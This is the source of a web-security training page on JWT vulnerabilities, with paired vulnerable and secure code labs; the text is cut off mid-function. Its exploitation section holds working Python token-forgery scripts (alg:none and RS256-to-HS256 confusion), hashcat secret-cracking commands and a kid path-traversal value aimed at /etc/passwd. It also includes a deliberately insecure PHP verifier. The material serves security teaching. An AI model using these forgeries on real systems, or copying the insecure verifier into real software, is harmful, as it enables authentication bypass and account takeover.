<?php
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Config/db.php');
session_start();
$isLoggedIn = isset($_SESSION['user_id']);
$isStrictAuth = true;


$pageTitle = "JSON Web Token (JWT) - Complete Guide | DarkHunter";
$currentPage = "jwt-module";
?>
<!DOCTYPE html>
<html lang="en" dir="ltr">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description"
    content="Master JWT vulnerabilities - Understanding JSON Web Token attacks from algorithm confusion to key injection. Complete cybersecurity training module.">
  <title><?php echo $pageTitle; ?></title>

  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link
    href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap"
    rel="stylesheet">
  <link rel="stylesheet" type="text/css" href="/DarkHunter/learningBugs/css/jwt-info.css?v=1.1">

</head>

<body>
  <div class="grid-bg"></div>
  <?php include_once $_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Public/login-modal.php'; ?>
  <button class="mobile-menu-btn" onclick="toggleSidebar()">☰</button>

  <div class="app-container">
    <a href="/DarkHunter/Public/Learning.php" class="modern-back-btn">
      <i>←</i>
      <span>Back to Modules</span>
    </a>

    <aside class="sidebar">
      <div class="sidebar-header">
        <div class="sidebar-brand">
          👾 <span>DARK</span>HUNTER
        </div>
      </div>

      <div class="nav-section">
        <div class="nav-title">Navigation</div>
        <ul class="nav-links">
          <li><a href="#overview" class="active"><i>📚</i> Overview</a></li>
          <li><a href="#mechanism"><i>⚙️</i> How It Works</a></li>
          <li><a href="#exploitation"><i>🎯</i> Exploitation Steps</a></li>
          <li><a href="#impact"><i>💥</i> Real-World Impact</a></li>
          <li><a href="#labs"><i>💻</i> Code Labs</a></li>
          <li><a href="#bypass"><i>🚧</i> Bypass Techniques</a></li>
          <li><a href="#mitigation"><i>🛡️</i> Prevention</a></li>
        </ul>
      </div>

      <div class="nav-section">
        <div class="nav-title">Related Modules</div>
        <ul class="nav-links">
          <li><a href="/DarkHunter/learningBugs/xss-info.php"><i>💻</i> XSS</a></li>
          <li><a href="/DarkHunter/learningBugs/sqli-info.php"><i>🗃️</i> SQL Injection</a></li>
          <li><a href="/DarkHunter/learningBugs/csrf-info.php"><i>🧬</i> CSRF</a></li>
          <li><a href="/DarkHunter/learningBugs/idor-info.php"><i>🆔</i> IDOR</a></li>
          <li><a href="/DarkHunter/learningBugs/ssrf-info.php"><i>🌐</i> SSRF</a></li>
          <li><a href="/DarkHunter/learningBugs/ssti-info.php"><i>🧪</i> SSTI</a></li>
          <li><a href="/DarkHunter/learningBugs/cors-info.php"><i>🔗</i> CORS</a></li>
          <li><a href="/DarkHunter/learningBugs/file-upload-info.php"><i>📤</i> File Upload</a></li>
          <li><a href="/DarkHunter/learningBugs/cache-poisoning-info.php"><i>🧃</i> Cache Poisoning</a></li>
          <li><a href="/DarkHunter/learningBugs/host-header-info.php"><i>🖥️</i> Host Header Injection</a></li>
          <li><a href="/DarkHunter/learningBugs/oauth-info.php"><i>🔑</i> OAUTH</a></li>
          <li><a href="/DarkHunter/learningBugs/http-smuggling-info.php"><i>📦</i> HTTP Smuggling</a></li>
          <li><a href="/DarkHunter/learningBugs/html-injection-info.php"><i>📝</i> HTML Injection</a></li>
          <li><a href="/DarkHunter/learningBugs/lfi-info.php"><i>📁</i> LFI</a></li>
          <li><a href="/DarkHunter/learningBugs/open-redirect-info.php"><i>↪️</i> Open Redirect</a></li>
          <li><a href="/DarkHunter/learningBugs/rce-info.php"><i>💻</i> RCE</a></li>
          <li><a href="/DarkHunter/learningBugs/race-condition-info.php"><i>⚡</i> Race Condition</a></li>
        </ul>
      </div>
    </aside>

    <main class="main-content">
      <div class="page-header">
        <h1 class="page-title">JSON Web Token (JWT)</h1>
        <p class="page-subtitle">
          Master JWT security vulnerabilities from algorithm confusion attacks to key injection. Learn how attackers
          forge tokens and bypass authentication in modern applications.
        </p>
      </div>

      <div class="content-card">
        <div class="toc">
          <div class="toc-title">📋 Table of Contents</div>
          <ul class="toc-list">
            <li><a href="#overview">1. What is JWT?</a></li>
            <li><a href="#mechanism">2. Technical Mechanism</a></li>
            <li><a href="#exploitation">3. Exploitation Steps</a></li>
            <li><a href="#impact">4. Real-World Impact</a></li>
            <li><a href="#labs">5. Code Labs: Vulnerable vs Secure</a></li>
            <li><a href="#bypass">6. Bypass Techniques</a></li>
            <li><a href="#mitigation">7. Prevention Checklist</a></li>
          </ul>
        </div>
      </div>

      <div id="overview" class="content-card">
        <h2 class="card-title"><i>📚</i> What is JSON Web Token (JWT)?</h2>

        <div class="highlight-box">
          <strong>Definition:</strong> JSON Web Token (JWT) is an open standard (RFC 7519) that defines a compact,
          self-contained way for securely transmitting information between parties as a JSON object. JWT vulnerabilities
          occur when implementations fail to properly validate tokens, allowing attackers to forge, modify, or bypass
          authentication entirely.
        </div>

        <p class="text-content">
          JWT has become the de facto standard for stateless authentication in modern web applications and APIs. Unlike
          session-based authentication where session data is stored server-side, JWT encapsulates all necessary user
          information within the token itself. This architectural decision, while offering scalability benefits, creates
          unique security challenges when implementations are flawed.
        </p>

        <div class="danger-box">
          <strong>⚠️ Critical Impact:</strong> JWT vulnerabilities can lead to complete authentication bypass, account
          takeover, privilege escalation, and unauthorized access to protected resources. Since JWTs often carry
          authorization claims, a single forged token can grant an attacker administrative access to an entire
          application or API ecosystem.
        </div>

        <h3 class="subsection-title">CVSS Severity Assessment</h3>
        <div class="highlight-box">
          <strong>CVSS Score Range: 7.5 - 10.0 (High to Critical)</strong>
          <ul style="margin-left: 2rem; margin-top: 0.5rem;">
            <li><strong>Attack Vector:</strong> Network (remotely exploitable)</li>
            <li><strong>Attack Complexity:</strong> Low to Medium (depends on vulnerability type)</li>
            <li><strong>Privileges Required:</strong> None (for alg:none) or Low (for other attacks)</li>
            <li><strong>User Interaction:</strong> None (direct API exploitation)</li>
            <li><strong>Scope:</strong> Unchanged (affects vulnerable application)</li>
            <li><strong>Impact:</strong> High on Confidentiality, Integrity, and Availability</li>
          </ul>
        </div>

        <h3 class="subsection-title">JWT Structure Overview</h3>
        <p class="text-content">
          A JWT consists of three parts separated by dots (.), each Base64Url encoded:
        </p>

        <div class="code-block">
          <div class="code-header"><span class="code-label">JWT Structure</span></div>
          <pre><code><span class="code-comment">-- Header (Algorithm & Token Type)</span>
<span class="code-attr">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span>
<span class="code-comment">-- Decoded: {"alg":"HS256","typ":"JWT"}</span>

<span class="code-comment">-- Payload (Claims/Data)</span>
<span class="code-attr">eyJ1c2VyX2lkIjoxMjMsInJvbGUiOiJ1c2VyIn0</span>
<span class="code-comment">-- Decoded: {"user_id":123,"role":"user"}</span>

<span class="code-comment">-- Signature (Verification)</span>
<span class="code-attr">SflKxwRJSMeKKF2QT4fwpMe...</span>

<span class="code-comment">-- Complete JWT</span>
<span class="code-string">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMjMsInJvbGUiOiJ1c2VyIn0.SflKxwRJSMeKKF2QT4fwpMe...</span></code></pre>
        </div>

        <div class="highlight-box">
          <table style="width: 100%; border-collapse: collapse; margin-top: 1rem;">
            <tr style="border-bottom: 1px solid var(--border-color);">
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-green);">Component</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-purple);">Purpose</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--danger);">Security Risk</th>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Header</td>
              <td style="padding: 0.75rem;">Specifies algorithm and token type</td>
              <td style="padding: 0.75rem;">Algorithm confusion attacks</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Payload</td>
              <td style="padding: 0.75rem;">Contains claims and user data</td>
              <td style="padding: 0.75rem;">Tampering, information disclosure</td>
            </tr>
            <tr>
              <td style="padding: 0.75rem;">Signature</td>
              <td style="padding: 0.75rem;">Verifies token integrity</td>
              <td style="padding: 0.75rem;">Weak secrets, algorithm bypass</td>
            </tr>
          </table>
        </div>

        <div class="diagram-container">
          <div class="diagram-label">📊 JWT Architecture Diagram</div>
          <div class="diagram-placeholder">
            <i>🖼️</i><br>
            [Insert Diagram: Client → Login → Server Signs JWT → Client Stores → Subsequent Requests with JWT → Server
            Verifies]
          </div>
        </div>
      </div>

      <div id="mechanism" class="content-card">
        <h2 class="card-title"><i>⚙️</i> How JWT Works: Technical Deep Dive</h2>

        <h3 class="subsection-title">Signing Algorithms: Symmetric vs Asymmetric</h3>
        <p class="text-content">
          JWT supports multiple signing algorithms, each with distinct security characteristics and vulnerability
          profiles:
        </p>

        <div class="highlight-box">
          <strong>HMAC Algorithms (Symmetric):</strong>
          <ul style="margin-left: 2rem;">
            <li><code>HS256</code> (HMAC-SHA256) - Most common, single shared secret</li>
            <li><code>HS384</code>, <code>HS512</code> - Stronger hash functions</li>
            <li><strong>Risk:</strong> Secret key must be shared between parties; if leaked, anyone can forge tokens
            </li>
          </ul>
          <strong>RSA/ECDSA Algorithms (Asymmetric):</strong>
          <ul style="margin-left: 2rem;">
            <li><code>RS256</code> (RSA-SHA256) - Private key signs, public key verifies</li>
            <li><code>ES256</code> (ECDSA-SHA256) - Elliptic curve variant</li>
            <li><strong>Risk:</strong> Algorithm confusion if public key is exposed</li>
          </ul>
        </div>

        <h3 class="subsection-title">The Algorithm Confusion Vulnerability</h3>
        <p class="text-content">
          The most critical JWT vulnerability stems from the fact that the algorithm is specified in the header and
          not inherently tied to the key type. This allows attackers to manipulate the algorithm header to bypass
          signature verification.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Algorithm Confusion Attack</span></div>
          <pre><code><span class="code-comment">-- Server expects RS256 (asymmetric) and uses public key for verification</span>
<span class="code-comment">-- Attacker changes algorithm to HS256 (symmetric)</span>

<span class="code-comment">-- Original Header</span>
{<span class="code-attr">"alg"</span>:<span class="code-string">"RS256"</span>,<span class="code-attr">"typ"</span>:<span class="code-string">"JWT"</span>}

<span class="code-comment">-- Attacker's Modified Header</span>
{<span class="code-attr">"alg"</span>:<span class="code-string">"HS256"</span>,<span class="code-attr">"typ"</span>:<span class="code-string">"JWT"</span>}

<span class="code-comment">-- Server now uses public key as HMAC secret</span>
<span class="code-comment">-- Attacker signs token with public key (known to everyone)</span>
<span class="code-comment">-- Server verifies: HMAC(payload, public_key) == signature ✓</span></code></pre>
        </div>

        <h3 class="subsection-title">The "None" Algorithm Attack</h3>
        <p class="text-content">
          Some JWT libraries support the "none" algorithm for unsecured tokens. If the server accepts tokens without
          signatures, attackers can forge any token by simply setting alg to "none".
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">None Algorithm Exploitation</span></div>
          <pre><code><span class="code-comment">-- Attacker creates header with alg: "none"</span>
{<span class="code-attr">"alg"</span>:<span class="code-string">"none"</span>,<span class="code-attr">"typ"</span>:<span class="code-string">"JWT"</span>}

<span class="code-comment">-- Creates malicious payload</span>
{<span class="code-attr">"user_id"</span>:<span class="code-string">1</span>,<span class="code-attr">"role"</span>:<span class="code-string">"admin"</span>,<span class="code-attr">"iat"</span>:<span class="code-keyword">1234567890</span>}

<span class="code-comment">-- Signature is empty</span>
<span class="code-comment">-- Final token: header.payload. (note the trailing dot)</span>

<span class="code-string">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4ifQ.</span></code></pre>
        </div>

        <h3 class="subsection-title">Weak Secret Exploitation</h3>
        <p class="text-content">
          HMAC-based JWTs depend entirely on the secrecy and strength of the signing key. Weak, short, or
          commonly-used secrets can be cracked through brute force or dictionary attacks.
        </p>

        <div class="code-block">
          <div class="code-header"><span class="code-label">Secret Cracking with hashcat</span></div>
          <pre><code><span class="code-comment">-- Extract JWT signature</span>
<span class="code-string">hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt</span>

<span class="code-comment">-- john the ripper</span>
<span class="code-string">john --format=HMAC-SHA256 jwt.txt --wordlist=passwords.txt</span>

<span class="code-comment">-- Common weak secrets to test</span>
<span class="code-string">secret</span>
<span class="code-string">password</span>
<span class="code-string">123456</span>
<span class="code-string">jwt-secret</span>
<span class="code-string">your-256-bit-secret</span>  <span class="code-comment">-- From documentation examples!</span></code></pre>
        </div>

        <div class="attack-flow">
          <div class="flow-step">
            <div class="flow-icon victim">🔑</div>
            <div class="flow-label">Obtain JWT</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">Intercept or leak token</p>
          </div>
          <div class="flow-step">
            <div class="flow-icon server">🔍</div>
            <div class="flow-label">Analyze Structure</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">Decode header & payload</p>
          </div>
          <div class="flow-step">
            <div class="flow-icon attack">⚡</div>
            <div class="flow-label">Identify Weakness</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">Alg none, weak secret,
              confusion</p>
          </div>
          <div class="flow-step">
            <div class="flow-icon server">✏️</div>
            <div class="flow-label">Forge Token</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">Modify claims & sign</p>
          </div>
          <div class="flow-step">
            <div class="flow-icon attack">🚪</div>
            <div class="flow-label">Bypass Auth</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">Access protected resources</p>
          </div>
        </div>
      </div>

      <div id="exploitation" class="content-card">
        <h2 class="card-title"><i>🎯</i> Exploitation Steps: JWT Attacks</h2>

        <h3 class="subsection-title">Step 1: Token Acquisition and Analysis</h3>
        <p class="text-content">
          Capture JWTs from authentication responses, local storage, or cookies. Analyze structure and identify
          potential vulnerabilities.
        </p>

        <div class="highlight-box">
          <strong>Token Sources:</strong>
          <ul style="margin-left: 2rem;">
            <li>Authentication response headers: <code>Authorization: Bearer &lt;token&gt;</code></li>
            <li>Cookies: <code>auth=&lt;token&gt;; session=&lt;token&gt;</code></li>
            <li>Local/Session Storage in browser DevTools</li>
            <li>API responses containing embedded tokens</li>
            <li>URL parameters (less common, dangerous)</li>
          </ul>
        </div>

        <div class="code-block">
          <div class="code-header"><span class="code-label">JWT Decoding with jwt.io</span></div>
          <pre><code><span class="code-comment">-- Paste token into jwt.io debugger</span>
<span class="code-comment">-- Or use command line tools</span>

<span class="code-comment">-- Bash decode (split by dot, base64 decode)</span>
<span class="code-keyword">function</span> <span class="code-function">jwt_decode</span>() {
    <span class="code-keyword">echo</span> <span class="code-string">"$1"</span> | <span class="code-function">cut</span> -d <span class="code-string">"."</span> -f 1 | <span class="code-function">base64</span> -d 2>/dev/null | <span class="code-function">jq</span> .
    <span class="code-keyword">echo</span> <span class="code-string">"$1"</span> | <span class="code-function">cut</span> -d <span class="code-string">"."</span> -f 2 | <span class="code-function">base64</span> -d 2>/dev/null | <span class="code-function">jq</span> .
}

<span class="code-comment">-- Python decode</span>
<span class="code-keyword">import</span> jwt
<span class="code-keyword">import</span> base64

token = <span class="code-string">"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."</span>
header, payload, signature = token.split(<span class="code-string">'.'</span>)
print(base64.b64decode(header + <span class="code-string">'=='</span>))
print(base64.b64decode(payload + <span class="code-string">'=='</span>))</code></pre>
        </div>

        <h3 class="subsection-title">Step 2: Algorithm Analysis</h3>
        <p class="text-content">
          Identify the signing algorithm and test for common misconfigurations:
        </p>

        <div class="code-block">
          <div class="code-header"><span class="code-label">Algorithm Testing</span></div>
          <pre><code><span class="code-comment">-- Check for alg: none acceptance</span>
<span class="code-comment">-- Modify header to {"alg":"none"} and remove signature</span>

<span class="code-comment">-- Check for algorithm confusion (RS256 → HS256)</span>
<span class="code-comment">-- If server uses RS256, try signing with public key as HMAC secret</span>

<span class="code-comment">-- Check for weak HMAC secrets</span>
<span class="code-string">hashcat -m 16500 token.txt rockyou.txt -o cracked.txt</span>

<span class="code-comment">-- Check for key ID (kid) injection</span>
<span class="code-comment">-- {"kid":"../../../etc/passwd","alg":"HS256"}</span></code></pre>
        </div>

        <h3 class="subsection-title">Step 3: Automated JWT Testing with Burp Suite</h3>
        <p class="text-content">
          Use Burp extensions and tools to automate JWT vulnerability discovery:
        </p>

        <div class="code-block">
          <div class="code-header"><span class="code-label">Burp Suite JWT Testing</span></div>
          <pre><code><span class="code-comment">-- Install JSON Web Token Attacker extension</span>
<span class="code-comment">-- Install JWT Editor extension</span>

<span class="code-comment">-- Automated tests:</span>
<span class="code-comment">1. Send token to Repeater</span>
<span class="code-comment">2. Modify algorithm to "none"</span>
<span class="code-comment">3. Remove signature (trailing dot)</span>
<span class="code-comment">4. Check if server accepts modified token</span>

<span class="code-comment">-- For RS256 → HS256 confusion:</span>
<span class="code-comment">1. Obtain public key from /jwks.json or certificate</span>
<span class="code-comment">2. Sign forged token with public key as HMAC secret</span>
<span class="code-comment">3. Change alg to HS256 in header</span>
<span class="code-comment">4. Send modified token</span></code></pre>
        </div>

        <h3 class="subsection-title">Step 4: Manual Token Forgery</h3>

        <h4>None Algorithm Forgery</h4>
        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">None Algorithm Exploit</span></div>
          <pre><code><span class="code-keyword">import</span> base64
<span class="code-keyword">import</span> json

<span class="code-comment"># Create header with alg: none</span>
header = {<span class="code-string">"alg"</span>: <span class="code-string">"none"</span>, <span class="code-string">"typ"</span>: <span class="code-string">"JWT"</span>}
payload = {<span class="code-string">"user_id"</span>: <span class="code-string">1</span>, <span class="code-string">"role"</span>: <span class="code-string">"admin"</span>, <span class="code-string">"iat"</span>: <span class="code-keyword">1234567890</span>}

<span class="code-comment"># Base64Url encode (replace +/ with -_ and remove padding)</span>
<span class="code-keyword">def</span> <span class="code-function">b64url</span>(data):
    <span class="code-keyword">return</span> base64.b64encode(json.dumps(data).encode()).decode().replace(<span class="code-string">'+'</span>, <span class="code-string">'-'</span>).replace(<span class="code-string">'/'</span>, <span class="code-string">'_'</span>).rstrip(<span class="code-string">'='</span>)

token = <span class="code-string">f"{b64url(header)}.{b64url(payload)}."</span>  <span class="code-comment"># Empty signature</span>
<span class="code-function">print</span>(token)</code></pre>
        </div>

        <h4>Algorithm Confusion Exploit (RS256 → HS256)</h4>
        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Algorithm Confusion Exploit</span></div>
          <pre><code><span class="code-keyword">import</span> jwt
<span class="code-keyword">from</span> Crypto.PublicKey <span class="code-keyword">import</span> RSA

<span class="code-comment"># Obtain public key from server</span>
public_key = <span class="code-string">"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA..."</span>

<span class="code-comment"># Forge token signed with public key as HMAC secret</span>
payload = {<span class="code-string">"user_id"</span>: <span class="code-string">1</span>, <span class="code-string">"role"</span>: <span class="code-string">"admin"</span>}
token = jwt.encode(payload, public_key, algorithm=<span class="code-string">"HS256"</span>, 
                   headers={<span class="code-string">"alg"</span>: <span class="code-string">"HS256"</span>, <span class="code-string">"typ"</span>: <span class="code-string">"JWT"</span>})

<span class="code-function">print</span>(token)</code></pre>
        </div>

        <div class="diagram-container">
          <div class="diagram-label">🎬 Video: JWT Exploitation with Burp Suite</div>
          <div class="video-placeholder">
            <i>▶️</i><br>
            [Insert Video: Step-by-step JWT algorithm confusion attack using Burp Suite]
          </div>
        </div>
      </div>

      <div id="impact" class="content-card">
        <h2 class="card-title"><i>💥</i> Real-World Impact: Notorious JWT Breaches</h2>

        <h3 class="subsection-title">Case Study 1: Auth0 JWT Validation Bypass (2017)</h3>
        <p class="text-content">
          Auth0, a leading identity management platform, had a critical vulnerability where their JWT validation
          library accepted tokens with algorithm "none" under certain conditions. This allowed attackers to bypass
          authentication entirely by forging tokens with arbitrary claims.
        </p>
        <div class="danger-box">
          <strong>Impact:</strong> Complete authentication bypass for all applications using the vulnerable library.
          Attackers could impersonate any user, including administrators, without knowing any secrets.
        </div>

        <h3 class="subsection-title">Case Study 2: Firebase JWT Algorithm Confusion (2021)</h3>
        <p class="text-content">
          Security researchers discovered that Firebase's JWT implementation was vulnerable to algorithm confusion
          attacks. By changing the algorithm from RS256 to HS256 and signing with the public key, attackers could
          forge valid authentication tokens for any Firebase project.
        </p>
        <div class="warning-box">
          <strong>Attack Chain:</strong> Obtain public key from Firebase project → Change alg to HS256 → Sign forged
          token with public key → Server verifies using public key as HMAC secret → Authentication bypass.
        </div>

        <h3 class="subsection-title">Case Study 3: Symfony JWT Authentication Bypass (2019)</h3>
        <p class="text-content">
          The popular PHP framework Symfony had a vulnerability in its JWT authentication bundle where the "none"
          algorithm was not explicitly rejected. Attackers could forge tokens by simply setting alg to "none" and
          removing the signature.
        </p>
        <div class="highlight-box">
          <strong>Impact:</strong> Thousands of applications using Symfony's LexikJWTAuthenticationBundle were
          potentially vulnerable to complete authentication bypass until patched.
        </div>

        <h3 class="subsection-title">Common Attack Scenarios by Industry</h3>

        <div class="highlight-box">
          <table style="width: 100%; border-collapse: collapse;">
            <tr style="border-bottom: 1px solid var(--border-color);">
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-green);">Industry</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-purple);">JWT Attack Scenario</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--danger);">Potential Damage</th>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">SaaS/Cloud</td>
              <td style="padding: 0.75rem;">Forge admin tokens to access tenant data</td>
              <td style="padding: 0.75rem;">Multi-tenant data breach</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Fintech</td>
              <td style="padding: 0.75rem;">Modify token claims to authorize transactions</td>
              <td style="padding: 0.75rem;">Financial fraud, unauthorized transfers</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Healthcare</td>
              <td style="padding: 0.75rem;">Escalate privileges to access patient records</td>
              <td style="padding: 0.75rem;">HIPAA violations, privacy breach</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">E-Commerce</td>
              <td style="padding: 0.75rem;">Forge tokens to access other users' orders</td>
              <td style="padding: 0.75rem;">Data theft, order manipulation</td>
            </tr>
            <tr>
              <td style="padding: 0.75rem;">Enterprise</td>
              <td style="padding: 0.75rem;">Bypass SSO authentication</td>
              <td style="padding: 0.75rem;">Complete network compromise</td>
            </tr>
          </table>
        </div>
      </div>

      <div id="labs" class="content-card">
        <h2 class="card-title"><i>💻</i> Code Labs: Vulnerable vs Secure Implementation</h2>

        <div class="warning-box">
          <strong>🎯 Lab Objective:</strong> Understand how improper JWT validation enables authentication bypass,
          then implement secure token verification with algorithm whitelisting and strong secrets.
        </div>

        <h3 class="subsection-title">Lab 1: Vulnerable JWT Verification (Algorithm Not Validated)</h3>
        <p class="text-content">
          <strong>Vulnerability:</strong> Accepting any algorithm specified in the token header without validation.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header">
            <span class="code-label">❌ Vulnerable PHP Code</span>
            <div class="code-actions">
              <button class="code-btn" onclick="copyCode(this)">📋 Copy</button>
            </div>
          </div>
          <pre><code><span class="code-keyword">&lt;?php</span>
<span class="code-keyword">require_once</span> <span class="code-string">'vendor/autoload.php'</span>;
<span class="code-keyword">use</span> \<span class="code-function">Firebase</span>\<span class="code-function">JWT</span>\<span class="code-function">JWT</span>;

<span class="code-keyword">$jwt</span> = <span class="code-keyword">$_SERVER</span>[<span class="code-string">'HTTP_AUTHORIZATION'</span>];
<span class="code-keyword">$secret</span> = <span class="code-string">"weak-secret"</span>;

<span class="code-keyword">try</span> {
    <span class="code-comment">// DANGEROUS: No algorithm specified - accepts any!</span>
    <span class="code-keyword">$decoded</span> = JWT::<span class="code-function">decode</span>(<span class="code-keyword">$jwt</span>, <span class="code-keyword">$secret</span>, [<span class="code-string">'HS256'</span>, <span class="code-string">'HS512'</span>, <span class="code-string">'RS256'</span>]);
    
    <span class="code-comment">// Even more dangerous: empty allowed_algorithms</span>
    <span class="code-comment">// $decoded = JWT::decode($jwt, $secret);</span>
    
    <span class="code-keyword">echo</span> <span class="code-string">"User ID: "</span> . <span class="code-keyword">$decoded</span>->user_id;
} <span class="code-keyword">catch</span> (<span class="code-function">Exception</span> <span class="code-keyword">$e</span>) {
    <span class="code-keyword">echo</span> <span class="code-string">"Invalid token"</span>;
}
<span class="code-keyword">?&gt;</span></code></pre>
        </div>

        <div class="code-block code-secure">
          <div class="code-header">
            <span class="code-label">✅ Secure Implementation</span>
            <div class="code-actions">
              <button class="code-btn" onclick="copyCode(this)">📋 Copy</button>
            </div>
          </div>
          <pre><code><span class="code-keyword">&lt;?php</span>
<span class="code-keyword">require_once</span> <span class="code-string">'vendor/autoload.php'</span>;
<span class="code-keyword">use</span> \<span class="code-function">Firebase</span>\<span class="code-function">JWT</span>\<span class="code-function">JWT</span>;
<span class="code-keyword">use</span> \<span class="code-function">Firebase</span>\<span class="code-function">JWT</span>\<span class="code-function">Key</span>;

<span class="code-keyword">$jwt</span> = <span class="code-keyword">$_SERVER</span>[<span class="code-string">'HTTP_AUTHORIZATION'</span>];
<span class="code-keyword">$secret</span> = <span class="code-function">getenv</span>(<span class="code-string">'JWT_SECRET'</span>);  <span class="code-comment">// From environment variable</span>

<span class="code-keyword">try</span> {
    <span class="code-comment">// CRITICAL: Explicitly specify allowed algorithm</span>
    <span class="code-keyword">$decoded</span> = JWT::<span class="code-function">decode</span>(<span class="code-keyword">$jwt</span>, <span class="code-keyword">new</span> <span class="code-function">Key</span>(<span class="code-keyword">$secret</span>, <span class="code-string">'HS256'</span>));
    
    <span class="code-comment">// Verify additional claims</span>
    <span class="code-keyword">if</span> (<span class="code-keyword">$decoded</span>->iss !== <span class="code-string">'https://trusted-issuer.com'</span>) {
        <span class="code-keyword">throw</span> <span class="code-keyword">new</span> <span class="code-function">Exception</span>(<span class="code-string">'Invalid issuer'</span>);
    }
    
    <span class="code-keyword">if</span> (<span class="code-keyword">$decoded</span>->exp < <span class="code-function">time</span>()) {
        <span class="code-keyword">throw</span> <span class="code-keyword">new</span> <span class="code-function">Exception</span>(<span class="code-string">'Token expired'</span>);
    }
    
    <span class="code-keyword">echo</span> <span class="code-string">"User ID: "</span> . <span class="code-keyword">$decoded</span>->sub;
} <span class="code-keyword">catch</span> (<span class="code-function">Exception</span> <span class="code-keyword">$e</span>) {
    <span class="code-function">http_response_code</span>(<span class="code-keyword">401</span>);
    <span class="code-keyword">echo</span> <span class="code-string">"Authentication failed"</span>;
}
<span class="code-keyword">?&gt;</span></code></pre>
        </div>

        <h3 class="subsection-title">Lab 2: Secure Secret Management</h3>
        <p class="text-content">
          <strong>Vulnerability:</strong> Hardcoded secrets, weak secrets, or secrets committed to version control.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">❌ Vulnerable Secret Handling</span></div>
          <pre><code><span class="code-comment">// Hardcoded weak secret</span>
<span class="code-keyword">const</span> JWT_SECRET = <span class="code-string">"secret123"</span>;

<span class="code-comment">// Secret in version control</span>
<span class="code-comment">// config.json: { "jwt_secret": "my-super-secret-key" }</span>

<span class="code-comment">// Short secret (brute-forceable)</span>
<span class="code-keyword">const</span> JWT_SECRET = <span class="code-string">"abc"</span>;</code></pre>
        </div>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">✅ Secure Secret Management</span></div>
          <pre><code><span class="code-comment">// Load from environment variable</span>
<span class="code-keyword">const</span> JWT_SECRET = process.env.JWT_SECRET;

<span class="code-comment">// Generate strong secret (256-bit minimum)</span>
<span class="code-comment">// node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"</span>

<span class="code-comment">// Use AWS Secrets Manager / HashiCorp Vault</span>
<span class="code-keyword">const</span> AWS = <span class="code-function">require</span>(<span class="code-string">'aws-sdk'</span>);
<span class="code-keyword">const</span> secretsManager = <span class="code-keyword">new</span> <span class="code-function">AWS.SecretsManager</span>();
<span class="code-keyword">const</span> secret = <span class="code-keyword">await</span> secretsManager.<span class="code-function">getSecretValue</span>({
    SecretId: <span class="code-string">'prod/jwt-secret'</span>
}).<span class="code-function">promise</span>();</code></pre>
        </div>

        <h3 class="subsection-title">Lab 3: Node.js Secure JWT Implementation</h3>
        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">✅ Secure Node.js Implementation</span></div>
          <pre><code><span class="code-keyword">const</span> jwt = <span class="code-function">require</span>(<span class="code-string">'jsonwebtoken'</span>);
<span class="code-keyword">const</span> crypto = <span class="code-function">require</span>(<span class="code-string">'crypto'</span>);

<span class="code-keyword">const</span> JWT_CONFIG = {
    algorithm: <span class="code-string">'HS256'</span>,           <span class="code-comment">// Explicit algorithm</span>
    expiresIn: <span class="code-string">'15m'</span>,             <span class="code-comment">// Short expiration</span>
    issuer: <span class="code-string">'https://api.example.com'</span>,
    audience: <span class="code-string">'https://app.example.com'</span>
};

<span class="code-comment">// Generate secure token</span>
<span class="code-keyword">function</span> <span class="code-function">generateToken</span>(user) {
    <span class="code-keyword">return</span> jwt.<span class="code-function">sign</span>(
        { sub: user.id, role: user.role },
        process.env.JWT_SECRET,
        JWT_CONFIG
    );
}

<span class="code-comment">// Verify with strict options</span>
<span class="code-keyword">function</span> <span class="code-function">verifyToken</span>(token) {
